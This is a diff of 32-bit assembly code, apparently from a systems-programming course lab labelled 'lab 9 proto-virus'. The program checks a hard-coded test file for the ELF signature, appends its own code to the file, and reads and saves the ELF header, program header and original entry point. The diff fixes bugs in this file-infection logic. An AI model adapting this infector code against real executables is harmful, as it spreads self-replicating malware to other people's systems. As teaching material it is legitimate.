@@ -62,8 +62,8 @@ global _start
 	pushad
 	get_symbal_rt_address_to_ecx OutStr
 	mov ebx, ecx
-	get_symbal_rt_address_to_ecx OutStr_len 
-	write 1, ebx, ecx
+	;get_symbal_rt_address_to_ecx OutStr_len 
+	write 1, ebx, 32
 	popad
 	;write 1, OutStr, OutStr_len
 %endmacro
@@ -72,8 +72,8 @@ global _start
 	pushad
 	get_symbal_rt_address_to_ecx Failstr
 	mov ebx, ecx
-	get_symbal_rt_address_to_ecx Failstr_len 
-	write 1, ebx, ecx
+	;get_symbal_rt_address_to_ecx Failstr_len 
+	write 1, ebx, 13
 	popad
 	;write 1, Failstr, Failstr_len
 %endmacro
@@ -82,8 +82,8 @@ global _start
 	pushad
 	get_symbal_rt_address_to_ecx OpenErrStr
 	mov ebx, ecx
-	get_symbal_rt_address_to_ecx OpenErrStr_len 
-	write 1, ebx, ecx
+	;get_symbal_rt_address_to_ecx OpenErrStr_len 
+	write 1, ebx, 16
 	popad
 	;write 1, OpenErrStr, OpenErrStr_len
 %endmacro
@@ -118,7 +118,9 @@ _start:
 	cmp dword[ebp-Local_1_EBP_OFFSET], -1
     jle VirusExit_with_err.print_openFail
 
-    read dword[ebp-Local_1_EBP_OFFSET],[ebp-Local_2_EBP_OFFSET],4; read from fd that is in [ebp-4] the magic numbers to begining address of [ebp-8]
+	mov ecx,ebp
+    sub ecx,Local_2_EBP_OFFSET;
+    read dword[ebp-Local_1_EBP_OFFSET],ecx,4; read from fd that is in [ebp-4] the magic numbers to begining address of [ebp-8]
     cmp byte[ebp-Local_2_EBP_OFFSET], 0x7f; elfmago0
     jne VirusExit_with_err;
     cmp byte[ebp-Local_2_EBP_OFFSET+1],'E'; elfmago1
@@ -135,13 +137,18 @@ _start:
 	.infection:
 	lseek dword[ebp-Local_1_EBP_OFFSET], 0, SEEK_END ; get to end of file
 	mov [ebp-Local_2_EBP_OFFSET],eax ; save to local the original file size
-	; get to ecx virus_end real time address
+	;; get to ecx virus_end real time address
 	get_symbal_rt_address_to_ecx virus_end
 	mov ebx, ecx
 	get_symbal_rt_address_to_ecx _start
 	sub ebx, ecx
 	write dword[ebp-Local_1_EBP_OFFSET], ecx, ebx ; write the print command
 	
+	;mov edx, virus_end
+	;sub edx, _start
+	;write dword[ebp-Local_1_EBP_OFFSET], _start, edx ; write the print command
+
+
 	.rewrite_elfheader:
 	lseek dword[ebp-Local_1_EBP_OFFSET],0,SEEK_SET;getting the file bact to begin point
     ;cmp eax,0
@@ -150,11 +157,14 @@ _start:
 	; Rewriting the original ELF header
 	; Copy original Elf header to stack 
 	;read dword[ebp-4],[ebp-8-52 = ebp-60],32
-	read dword[ebp-Local_1_EBP_OFFSET],[ebp-Local_2_EBP_OFFSET-ELFHDR_size],ELFHDR_size; elf header of size 52, 8 bytes from epb already in use
+	mov ecx,ebp
+    sub ecx,Local_2_EBP_OFFSET
+	sub ecx,ELFHDR_size
+	read dword[ebp-Local_1_EBP_OFFSET],ecx,ELFHDR_size; elf header of size 52, 8 bytes from epb already in use
     ;save old entry point
 	mov ebx, dword[ebp-60+ENTRY] ; begining of elf header on stack + ENTRY offset
 	;mov dword[ebp-8-52-4 = ebp-64], ecx 
-	mov dword[ebp-Local_2_EBP_OFFSET-ELFHDR_size-4], ecx ; Save old entry to [ebp-64]
+	mov dword[ebp-Local_2_EBP_OFFSET-ELFHDR_size-4], ebx ; Save old entry to [ebp-64]
 
 	;; last used offset is 64 ;;
 
@@ -164,12 +174,17 @@ _start:
 	; Update file size - file size is in program header table
 
 	mov eax, [ebp-60+ELFHDR_phoff] ; now [eax] is begining offset of program header
-	mov eax, [eax] ;now eax is program header offset 
+	;mov eax, [eax] ;now eax is program header offset 
 
 	lseek dword[ebp-Local_1_EBP_OFFSET], eax, SEEK_SET ;fd is now pointing to read program header
 	; Copy original Elf program header to stack 
 	; read dword[ebp-4],[ebp-8-52-4-32 = ebp-96],32
-	read dword[ebp-Local_1_EBP_OFFSET],[ebp-Local_2_EBP_OFFSET-ELFHDR_size-4-PHDR_size],PHDR_size; elf header of size 52, 8 bytes from epb already in use
+	mov ecx,ebp
+    sub ecx,Local_2_EBP_OFFSET
+	sub ecx,ELFHDR_size
+	sub ecx,4
+	sub ecx,PHDR_size
+	read dword[ebp-Local_1_EBP_OFFSET],ecx,PHDR_size; elf header of size 52, 8 bytes from epb already in use
 
 
 
@@ -205,11 +220,14 @@ VirusExit_with_err:
 FileName:	db "ELFexecTestFile", 0
 ;FileName:	db "ELFexec1", 0
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
-OutStr_len: equ $-OutStr
+;OutStr_len: equ $-OutStr
+;OutStr_len: db 32
 Failstr:        db "perhaps not", 10 , 0
-Failstr_len: equ $-Failstr
+;Failstr_len: equ $-Failstr
+;Failstr_len: db 13
 OpenErrStr: db "File open fail", 10, 0
-OpenErrStr_len: equ $-OpenErrStr
+;OpenErrStr_len: equ $-OpenErrStr
+;OpenErrStr_len: db 16
 
 get_my_loc:
 	call next_i
